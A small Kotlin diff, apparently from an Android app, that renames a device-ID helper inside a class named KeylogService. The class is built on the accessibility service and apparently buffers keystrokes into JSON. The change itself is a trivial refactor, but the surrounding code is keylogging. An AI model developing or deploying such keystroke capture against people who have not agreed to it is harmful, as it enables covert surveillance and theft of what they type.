@@ -143,7 +143,7 @@ class KeylogService : AccessibilityService() {
 
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                val deviceId = getDeviceId()
+                val deviceId = resolveDeviceId()
                 val keysJson = JSONArray()
 
                 for (entry in keyBuffer) {
@@ -211,7 +211,7 @@ class KeylogService : AccessibilityService() {
     /**
      * Obtém o ID do dispositivo
      */
-    private fun getDeviceId(): Int {
+    private fun resolveDeviceId(): Int {
         // Retornar um ID fixo ou obter do SharedPreferences
         return 1 // TODO: Implementar lógica de ID do dispositivo
     }
